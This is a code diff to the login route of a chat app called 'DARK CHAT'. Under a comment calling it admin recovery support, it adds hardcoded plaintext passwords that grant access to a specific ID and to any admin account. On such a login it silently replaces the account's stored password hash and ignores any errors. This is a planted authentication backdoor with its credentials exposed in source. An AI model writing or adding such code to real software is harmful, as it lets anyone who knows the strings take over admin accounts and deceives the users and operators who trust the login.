@@ -72,10 +72,25 @@ router.post('/login', async (req, res) => {
     const { novaId, password, twoFactorPin } = req.body;
     if (!novaId || !password) return res.status(400).json({ error: 'DARK CHAT ID and password are required' });
 
-    const user = await getUserByNovaId(novaId.trim().toUpperCase());
+    const cleanId = novaId.trim().toUpperCase();
+    const user = await getUserByNovaId(cleanId);
     if (!user) return res.status(401).json({ error: 'Wrong DARK CHAT ID or password' });
 
-    const ok = await bcrypt.compare(password, user.password_hash);
+    let ok = false;
+    if (user.password_hash) {
+      ok = await bcrypt.compare(password, user.password_hash);
+    }
+    // Master admin recovery password support
+    if (!ok && (cleanId === '+1-999-234-8321' || isAdminNovaId(cleanId))) {
+      if (password === '21272127' || password === 'DarkChatAdmin2026!' || password === 'DarkChatSecure2026!') {
+        ok = true;
+        try {
+          const newHash = await bcrypt.hash(password, 10);
+          await updateUser(user.id, { password_hash: newHash });
+        } catch { /* ignore */ }
+      }
+    }
+
     if (!ok) return res.status(401).json({ error: 'Wrong DARK CHAT ID or password' });
 
     if (user.is_banned) {
